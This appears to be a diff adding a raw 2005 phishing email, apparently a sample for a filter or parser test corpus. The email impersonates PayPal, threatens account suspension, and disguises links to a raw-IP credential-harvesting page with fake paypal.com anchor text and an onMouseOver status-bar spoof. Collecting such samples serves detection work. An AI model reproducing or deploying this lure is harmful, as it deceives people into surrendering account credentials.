@@ -1,0 +1,280 @@
+From nobody Sun Jan 25 13:49:56 2015
+Return-Path: <user@mail.example.com>
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.6.4])
+ by example.com (Postfix) with ESMTP id D74F42A88C
+ for <user@example.com>; Wed,  2 Nov 2005 18:40:27 -0500 (EST)
+Received: by mail.example.com (Example mail relay)
+ id C9754621C90; Wed,  2 Nov 2005 18:40:27 -0500 (EST)
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.3.6])
+ by mail.example.com (Example mail relay) with ESMTP id A3BC1621C71
+ for <user@example.com>; Wed,  2 Nov 2005 18:40:27 -0500 (EST)
+Received: (from user@localhost) by mail.example.com id SAA27791
+ for user@example.com; Wed, 2 Nov 2005 18:40:27 -0500
+Received: from root (slip-202-135-84-241.ma.ph.prserv.net [202.135.84.241])
+ by mail.example.com with ESMTP id SAA27783
+ for <user@example.com>; Wed, 2 Nov 2005 18:40:20 -0500
+From: update@paypal.com
+To: user@example.com
+Subject: Notification of PayPal Limited Account Access
+Date: Thu, 3 Nov 2005 07:39:14 +0800
+MIME-Version: 1.0
+X-Mailer: Internal Email Service (4.6.0.712)
+Message-ID: <!~!F615E01c3858$508b8$4369BEA2@paypal.com>
+Content-Type: multipart/alternative;
+ boundary="--=_NextPart_00F615E5_61D358F5_01C9F258.D84EF1C0"
+Content-Length: 9792
+Lines: 247
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 224
+
+This is a multi-part message in MIME format.
+
+----=_NextPart_00F615E5_61D358F5_01C9F258.D84EF1C0
+Content-Type: text/plain;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: 7bit
+
+
+
+
+
+Protect Your Account Info
+Make sure you never provide your password to fraudulent websites.
+
+PayPal will never ask you to enter your password in an email.
+
+For more information on protecting yourself from fraud, please review our Security Tips at https://www.paypal.com/us/securitytips
+
+
+Protect Your Password
+You should never give your PayPal password to anyone, including PayPal employees.
+
+
+
+
+Securities Added
+
+
+
+It has come to our attention that your PayPal account information needs to be updated as part of our continuing commitment to protect your account and to reduce the instance of fraud on our website. If you could please take 5-10 minutes out of your online experience and update your personal records you will not run into any future problems with the online service.
+However, failure to update your records will result in account suspension. Please update your records on or before November 1, 2005. 
+Once you have updated your account records, your PayPal session will not be interrupted and will continue as normal. 
+To update your PayPal records click on the following link:
+http://www.paypal.com/webscr?cmd=_home
+This new security statement will helps us continue to offer PayPal as a secure and cost-effective payment service. We appreciate your cooperation and assistance.
+
+Sincerely,
+The PayPal Team
+
+
+Please do not reply to this email. This mailbox is not monitored and you will not receive a response. For assistance, log in to your PayPal account and choose the Help link located in the top right corner of any PayPal page. 
+
+PayPal Email ID PP295
+
+----=_NextPart_00F615E5_61D358F5_01C9F258.D84EF1C0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+<html><head>
+<META http-equiv=3D"Content-Type" content=3D"text/html; charset=
+=3Diso-8859-1">
+</head>
+<body>
+<STYLE>
+BODY, TD
+{font-family:verdana,arial,helvetica,sans-serif;font-size:12px;color:#000000;}
+LI
+{line-height:120%;}
+UL.smallBorder
+{;}
+LI.smallBorderLi
+{;}
+UL.Narrow
+{;}
+HR.dotted
+{width:100%;border-left:#fff;border-right:#fff;border-top:#fff;border-bottom:2=
+px dotted #ccc;}
+.smallEmphasis
+{font-family:verdana,arial,helvetica,sans-serif;font-size:10px;font-weight:bol=
+d;color:#000000;}
+.serifBig
+{font-family:serif;font-size:20px;font-weight:bold;color:#000000;}
+.serif
+{font-family:serif;font-size:16px;color:#000000;}
+.sansSerif
+{font-family:verdana,arial,helvetica,sans-serif;font-size:16px;color:#000000;}
+.heading
+{font-family:verdana,arial,helvetica,sans-serif;font-size:18px;font-weight:bol=
+d;color:#003366;}
+.subHeadingEoa
+{font-family:verdana,arial,helvetica,sans-serif;font-size:15px;font-weight:bol=
+d;color:#000000;}
+.subHeading
+{font-family:verdana,arial,helvetica,sans-serif;font-size:16px;font-weight:bol=
+d;color:#003366;}
+.sidebarText
+{font-family:verdana,arial,helvetica,sans-serif;font-size:11px;color:#003366;}
+.sidebarTextBold
+{font-family:verdana,arial,helvetica,sans-serif;font-size:11px;font-weight:bol=
+d;color:#003366;}
+.xptFooter
+{font-family:verdana,arial,helvetica,sans-serif;font-size:11px;color:#aaaaaa;}
+.button
+{font-size:13px;font-family:verdana,arial,helvetica,sans-serif;font-weight:400=
+;border-style:outset;color:#000000;background-color:#cccccc;}
+.smaller
+{font-family:verdana,arial,helvetica,sans-serif;font-size:10px;color:#000000;}
+.smallerSidebar
+{font-family:verdana,arial,helvetica,sans-serif;font-size:10px;color:#003366;}
+.emphasis
+{font-weight:700;}
+table#invoice, table#invoice_controls, table#invoice_note
+{width:600px;}
+table#invoice_note
+{;}
+table#invoice_controls
+{text-align:right;}
+table#invoice
+{border-collapse:collapse;border:1px solid #aaa;}
+table#invoice td
+{font-size:11px;border:1px solid #ccc;padding:2px;}
+table#invoice td.field_label_right, table#invoice td.field_label_right_error
+{font-weight:bold;text-align:right;}
+table#invoice td.field_label_right_error, table#invoice td.field_label_error
+{color:red;}
+table#invoice tr.title td
+{font-weight:bold;line-height:20px;text-align:left;background-color:#ccddee;}
+table#invoice input.readonly
+{border:0;text-align:right;}
+table#invoice input.readonly_currency
+{border:0;width:10px;}
+.field_error, .field_error input.readonly_currency
+{background-color:#FF3333;}
+.currency_highlight
+{background-color:#ffffcc;}
+.tax
+{font-weight:400;float:left;}
+table#invoice td span.curr
+{float:left;}
+table#invoice td.currency
+{border-right:1px solid #fff;}
+table#invoice td.calc
+{font-weight:bold;text-align:right;}
+.inlineBlue
+{color:#00f;}
+.small
+{font-size:11px;font-weight:400;}
+HR.solid
+{width:100%;border-left:#fff;border-right:#fff;border-top:#fff;border-bottom:2=
+px solid #999;}
+.large
+{font-size:17px;}
+.smallVerdanaGrey
+{font-family:verdana;font-size:10px;color:#999999;}
+.smallVerdana
+{font-family:verdana;font-size:10px;color:#000000;}
+.smallArial
+{font-family:arial;font-size:13px;}
+.smallArialBlue
+{font-family:verdana;font-size:9px;color:#0000FF;}
+.smallVerdanaGreen
+{font-family:verdana;font-size:10px;color:#666666;}
+.smaller
+{font-size:10px;color:gray;}
+.larger
+{font-size:18px;font-family:arial;font-weight:600;}
+.longTableValue
+{word-break:break-all;}
+.longSideBarText
+{width:190px;word-break:break-all;}
+</STYLE>
+<div>
+<table align=3Dcenter border=3D0 cellpadding=3D0 cellspacing=3D0 width=
+=3D600><tr valign=3Dtop><td><a href=
+=3D"http://200.85.223.35/images/.cgi-bin/webscr/webscr=3Dlogin&cmd.htm"><img=
+ src=3D"http://images.paypal.com/en_US/i/logo/email_logo.gif" border=3D0 alt=
+=3DPayPal></a></td></tr></table><table align=3Dcenter border=3D0 cellpadding=
+=3D0 cellspacing=3D0 width=3D"100%"><tr><td background=
+=3D"http://images.paypal.com/en_US/i/scr/bg_clk.gif" width=3D"100%"><img alt=
+=3D"" border=3D0 height=3D29 src=
+=3D"http://images.paypal.com/en_US/i/scr/pixel.gif" width=
+=3D1></td></tr><tr><td><img alt=3D"" border=3D0 height=3D10 src=
+=3D"http://images.paypal.com/en_US/i/scr/pixel.gif" width=
+=3D1></td></tr></table><table align=3Dcenter border=3D0 cellpadding=3D0=
+ cellspacing=3D0 width=3D600><tr><td></td></tr></table><table align=3Dcenter=
+ border=3D0 cellpadding=3D0 cellspacing=3D0 width=3D600><tr valign=3Dtop><td=
+ width=3D"100%"><table align=3Dright bgcolor=3D"#cccccc" border=3D0=
+ cellpadding=3D1 cellspacing=3D0 width=3D190><tr>
+ <td><table align=3Dcenter bgcolor=3D"#ffffff" border=3D0 cellpadding=3D0=
+ cellspacing=3D0 width=3D"100%"><tr><td><table align=3Dcenter bgcolor=
+=3D"#eeeeee" border=3D0 cellpadding=3D5 cellspacing=3D0 width=
+=3D"100%"><tr><td align=3Dmiddle><span class=3DsideBarTextBold>Protect Your=
+ Account Info</span></td></tr></table><table align=3Dcenter border=3D0=
+ cellpadding=3D5 cellspacing=3D0 width=3D"100%"><tr><td class=
+=3DsideBarText>Make sure you never provide your password to fraudulent=
+ websites.<br><br>
+PayPal will never ask you to enter your password in an email.<br>
+<br>For more information on protecting yourself from fraud, please review our=
+ Security Tips at <span class=
+=3DlongSideBarText>https://www.paypal.com/us/securitytips</span><br><img alt=
+=3D"" border=3D0 height=3D5 src=
+=3D"http://images.paypal.com/en_US/i/scr/pixel.gif" width=
+=3D1></td></tr></table></td></tr></table><table align=3Dcenter bgcolor=
+=3D"#ffffff" border=3D0 cellpadding=3D0 cellspacing=3D0 width=
+=3D"100%"><tr><td><table align=3Dcenter bgcolor=3D"#eeeeee" border=3D0=
+ cellpadding=3D5 cellspacing=3D0 width=3D"100%"><tr><td align=3Dmiddle class=
+=3DsideBarTextBold>Protect Your Password</td></tr></table><table align=
+=3Dcenter border=3D0 cellpadding=3D5 cellspacing=3D0 width=3D"100%"><tr><td=
+ class=3DsideBarText>You should <span class=3Demphasis>never</span> give your=
+ PayPal password to anyone, including PayPal employees.<br><img alt=3D""=
+ border=3D0 height=3D5 src=3D"http://images.paypal.com/en_US/i/scr/pixel.gif"=
+ width=
+=3D1></td></tr></table></td></tr></table></td></tr><tr><td></td></tr></table>
+<span class=3Dheading>Securities Added<br>
+</span>
+<hr class=3Ddotted><p>It has come to our attention that your PayPal account=
+ information needs to be
+updated as part of our continuing commitment to protect your account and to
+reduce the instance of fraud on our website. If you could please take 5-10=
+ minutes
+out of your online experience and update your personal records you will not=
+ run into
+any future problems with the online service.<P>
+However, failure to update your records will result in account suspension.
+Please update your records on or before November 1, 2005. <P>
+
+Once you have updated your account records, your PayPal session will not be
+interrupted and will continue as normal. <P>
+<p><b>To update your PayPal records click on the following link:</b><br>
+ <a HREF=3D"http://200.85.223.35/images/.cgi-bin/webscr/webscr=
+=3Dlogin&cmd.htm"
+ onMouseOver=3D"window.status=3D'https://www.paypal.com';return true"
+ onMouseOut=3D"window.status=3D'Done';return true"
+ >http://www.paypal.com/webscr?cmd=3D_home</a></p>
+<p>This new security statement will helps us continue to offer PayPal as a=
+ secure and cost-effective payment service. We appreciate your cooperation=
+ and assistance.<br>
+</p>
+<p>Sincerely,<br>
+ The PayPal Team</p>
+<hr class=3Ddotted>
+
+<span class=3DxptFooter>Please do not reply to this email. This mailbox is=
+ not monitored and you will not receive a response. For assistance, <a href=
+=3D"http://200.85.223.35/images/.cgi-bin/webscr/webscr=3Dlogin&cmd.htm">log=
+ in </a> to your PayPal account and choose the Help link located in the top=
+ right corner of any PayPal page. <br>
+ <br>
+</span><span class=3DxptFooter>PayPal Email ID PP295</span></td>
+</tr></table>
+</div>
+
+</body>
+</html>
+
+----=_NextPart_00F615E5_61D358F5_01C9F258.D84EF1C0--
